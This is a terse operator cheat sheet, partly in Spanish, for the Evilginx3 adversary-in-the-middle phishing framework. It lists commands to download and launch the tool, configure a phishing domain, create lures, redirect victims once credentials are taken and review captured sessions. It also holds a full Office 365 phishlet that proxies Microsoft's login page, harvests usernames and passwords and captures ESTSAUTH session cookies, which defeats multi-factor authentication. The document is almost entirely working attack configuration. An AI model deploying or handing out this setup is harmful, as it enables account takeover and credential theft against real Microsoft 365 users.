# Evilginx3

## Oneliners

### Download

```bash
wget https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx-v3.3.0-linux-64bit.zip
```

### Ejecutar

> Lanzar siempre sobre tmux para seguir ejecutando al finalizar conexion ssh

```bash
sudo ./evilginx -p ../phishlets
sudo ./evilginx -p ../phishlets -developer # para dev local
```

### Configs

> Now if you're not running a local development instance (started with -developer command line argument), Evilginx will start to automatically obtain the required TLS certificates from LetsEncrypt.

```bash
# Set up a domain
config domain <domain.com>
config ipv4 <public ip>
# Set up a phishlet
phishlets hostname <phishlet name> <domain.com>
phishlets enable <phishlet name>
phishlets disable <phishlet name> #deshabilitar
# Set up a lure
lures create <phishlet name>
lures get-url <id lure>
lures edit 0 redirect_url https://www.alux.cc # redirigir despues de obtener creds
# Get sessions
sessions
sessions <id session>
```

## Phishlets

Descargar los phishlets y moverlos a la carpeta de phishlets

### o365.yaml

```yaml
name: 'o365'
author: '@jamescullum'
min_ver: '3.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: false, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
  # The lines below are needed if your target organization utilizes ADFS.
  # If they do, you need to uncomment all following lines that contain <...>
  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
  #    <insert-adfs-subdomain> = adfs
  #    <insert-adfs-host> = example.com
  #    <insert-adfs-subdomain-and-host> = adfs.example.com
  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  # Uncomment and fill in if your target organization utilizes ADFS
  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_urls:
  - '/kmsi*'
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie','CCState']
  #- domain: 'webshell.suite.office.com'
  #  keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie','CCState']
credentials:
  username:
    key: '(login|UserName)'
    search: '(.*)'
    type: 'post'
  password:
    key: '(passwd|Password)'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
```

- https://github.com/An0nUD4Y/Evilginx2-Phishlets
- https://github.com/simplerhacking/Evilginx3-Phishlets
- https://github.com/hash3liZer/phishlets
- https://github.com/ArchonLabs/evilginx2-phishlets
- https://github.com/charlesbel/Evilginx2-Phishlets
